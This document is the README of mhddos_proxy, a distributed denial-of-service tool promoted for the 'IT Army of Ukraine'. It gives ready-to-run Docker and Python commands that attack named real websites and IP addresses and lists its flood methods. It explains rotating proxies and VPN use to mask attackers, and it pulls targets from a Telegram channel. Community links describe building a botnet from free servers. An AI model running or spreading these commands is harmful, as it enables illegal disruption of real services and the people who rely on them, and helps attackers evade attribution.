## DDoS Tool for IT Army of Ukraine 

- Built-in proxy server database to attack from a wide range of IPs around the world
- Possibility to set a huge number of targets with automatic load balancing
- A variety of different DDoS methods
- Effective utilization of your resources due to the asynchronous architecture

### ⏱ Recent Release Notes

Update versions for | Mac | Linux | Android | Docker (UA only so far): https://telegra.ph/Onovlennya-mhddos-proxy-04-16

- **18.05.2022**
  - Added `--copies` option in order to run multiple copies (recommended for use with 4+ CPUs and network > 100 Mb / s).

- **15.05.2022**
  - Completely updated the asynchronous version, which ensures maximum efficiency and minimum load on the system
  - Efficient operation with larger values of the `-t` parameter (up to 10k) without the risk of "freezing" the whole system
  - A brand-new algorithm for load balancing between targets in order to achieve maximum attack efficiency
  - Attack types `RGET`, `RHEAD`, `RHEX` and `STOMP` added

<details>
  <summary>📜 Earlier Releases</summary>

- **23.04.2022** 
  - The `--vpn` option has been changed - now your IP/VPN is being used **together** with the proxy, rather than instead. To restore the previous behavior, use `--vpn 100`
- **20.04.2022**
  - Significantly improved the system resources utilization for the best attack efficiency
  - Added `--udp-threads` option in order to control the intensity of UDP attacks (default 1)
- **18.04.2022** 
  - In the `--debug` mode, total statistics for all targets have been added
  - More proxy servers have been added
- **13.04.2022** 
  - Added the option to disable targets and add comments to the configuration file; now lines starting with '#' are ignored
  - Fixed an issue of crashing the script after a long run and other bugs while changing loops
  - Fixed color display on Windows terminal (without editing the registry)
  - In case of no targets available, the script will wait, instead of stopping completely
- **09.04.2022** New proxy utilization system; as of now everyone gets ~ 200 proxies to attack from a total pool of 10,000+. The `-p` (` --period`) and `--proxy-timeout` parameters are deprecated
- **04.04.2022** Added the ability to use your own proxy list for the attack: [instructions] (#custom-proxies)
- **03.04.2022** Fixed 'Too many open files' bug (thanks to @kobzar-darmogray and @euclid-catoptrics)
- **02.04.2022** Working threads are being reused rather than restarted for each cycle. Ctrl-C has also been fixed
- **01.04.2022** Updated CFB attack method to synchronize with MHDDoS
- **31.03.2022** Added some reliable DNS servers instead of system ones for name resolution (1.1.1.1, 8.8.8.8 etc.)
- **29.03.2022** Added support for the local configuration file (thanks to @kobzar-darmogray)
- **28.03.2022** Table output implemented `--table` (thanks to @alexneo2003)
- **27.03.2022**
    - Implemented DBG, BOMB (thanks to @drew-kun for PR), and KILLER methods to synchronize with the original MHDDoS
- **26.03.2022**
    - Launch a number of selected attacks instead of random ones
    - Reduced RAM utilization on a large number of targets; now only the `-t` parameter affects RAM
    - Added DNS caching and correct handling of resolving problems
- **25.03.2022** Added VPN mode instead of proxy (`--vpn` flag)
- **25.03.2022** 
  - MHDDoS has been put in the repository for overall control over development
</details>

### 💽 Installation - [instructions are here](/docs/installation.md)

### 🕹 Running (different options for targets are given)

#### Docker (for Linux, add sudo in front of the command)

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

#### Python (If it doesn't work, try `python` or `python3.10` instead of `python3`)

    python3 runner.py https://ria.ru 5.188.56.124:80 tcp://194.54.14.131:4477

### 🛠 Settings (check out more in the [CLI](#cli) section)

**All options can be combined**, you can specify them either before and after the list of targets

Change the workload: `-t XXXX`; the maximum number of simultaneously open connections; if the machine has one CPU, the default is 1000, if more than one, then is 7500.

***For Linux, add `sudo` in front of the `docker` command***

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

To monitor information about the attack progress, add the `--table` flag for the table-style display, `--debug` for the text

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru
    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru

To attack targets provided by https://t.me/itarmyofukraine2022 add the `--itarmy` option  

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table --itarmy

### 📌 New automatic proxy finder for mhddos_proxy
The script itself and installation instructions are here: https://github.com/porthole-ascend-cinnamon/proxy_finder

### 🐳 Community (mostly in Ukrainian)
- [Detailed analysis of mhddos_proxy and installation instructions](docs/installation.md)
- [Analysis of mhddos_proxy](https://telegra.ph/Anal%D1%96z-zasobu-mhddos-proxy-04-01)
- [Example of running via docker on OpenWRT](https://youtu.be/MlL6fuDcWlI)
- [Create a botnet of 30+ free and standalone Linux servers (even with PC is off)](https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c)
- [VPN](https://auto-ddos.notion.site/VPN-5e45e0aadccc449e83fea45d56385b54)

### CLI

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-c URL]
                     [--table]
                     [--debug]
                     [--vpn]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]
                     [--itarmy]
                     [--copies COPIES]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help            show this help message and exit
      -c, --config URL|path URL or local path to file with attack targets
      -t, --threads 2000    Total number of threads to run (default is CPU * 1000)
      --copies 1            Number of copies to run (default is 1)
      --rpc RPC             How many requests to send on a single proxy connection (default is 2000)
      --table               Print log as table
      --debug               Print log as text
      --vpn [USE_MY_IP]     Use both my IP and proxies for the attack. Optionally, specify a percent of using my IP (default is 10%)
      --http-methods        {DYN,PPS,BYPASS,OVH,TREX,NULL,GET,DOWNLOADER,CFB,RHEAD,AVB,EVEN,SLOW,STRESS,XMLRPC,RGET,HEAD,APACHE,COOKIE,STOMP,RHEX,POST} [{DYN,PPS,BYPASS,OVH,TREX,NULL,GET,DOWNLOADER,CFB,RHEAD,AVB,EVEN,SLOW,STRESS,XMLRPC,RGET,HEAD,APACHE,COOKIE,STOMP,RHEX,POST} ...]
                            List of HTTP(s) attack methods to use. Default is GET + POST|STRESS
      --proxies URL|path    URL or local path(ex. proxies.txt) to file with proxies to use 
      --itarmy              Attack targets from https://t.me/itarmyofukraine2022  
      --scheduler-initial-capacity SCHEDULER_INITIAL_CAPACITY
                            How many tasks per target to initialize on launch
      --scheduler-fork-scale SCHEDULER_FORK_SCALE
                            How many tasks to fork on successful connect to the target
      --scheduler-failure-delay SCHEDULER_FAILURE_DELAY
                            Time delay before re-launching failed tasks (seconds)
      --lang {EN,UA}        Interface and report language

### Custom proxies

#### File format:

    IP:PORT
    IP:PORT:username:password
    username:password@IP:PORT
    protocol://IP:PORT
    protocol://IP:PORT:username:password
    protocol://username:password@IP:PORT

where `protocol` can be one of 3 options: `http`|`socks4`|`socks5`. 
If `protocol` is not specified, default value `http` is being set.
For example, for a public proxy: `protocol=socks4 IP=114.231.123.38 PORT=3065` the format will be fhe following:
```shell
socks4://114.231.123.38:3065
```
and for private one: `protocol=socks4 IP=114.231.123.38 PORT=3065 username=isdfuser password=ashd1spass`
format can be one of the following:
```shell
socks4://114.231.123.38:3065:isdfuser:ashd1spass
socks4://isdfuser:ashd1spass@IP:PORT
```

**URL of the remote file for Python and Docker**

    python3 runner.py https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tass.ru --proxies https://pastebin.com/raw/UkFWzLOt
where https://pastebin.com/raw/UkFWzLOt is your web page with a list of proxies (each proxy should be on a new line)  

**Path for the local file for Python**  
  
Put the file in the folder with `runner.py` and add the following option to the command (replace `proxies.txt` with the name of your file)

    python3 runner.py --proxies proxies.txt https://ria.ru

where `proxies.txt` is your proxy list file (each proxy should be on a new line)

### Localization

As of now, the application supports 2 languages: English and Ukrainian. 
Default language is set by command line is Ukrainian, but it is likely to be changed as soon as we expand our community 
on other countries.

There are two ways to set the language:

### 1. By command line
    python3 runner.py --lang EN https://ria.ru
    python3 runner.py --lang UA https://ria.ru

Most likely, this is the way most Python users prefer to change it. 

### 2. By environment variable
    export MHDDOS_LANG=EN
    python3 runner.py https://ria.ru

An environment variable is easy to pass into the Docker container with the `-e` option

    docker run -e MHDDOS_LANG=UA -it --rm --log-driver none --name multidd --pull always karboduck/multidd
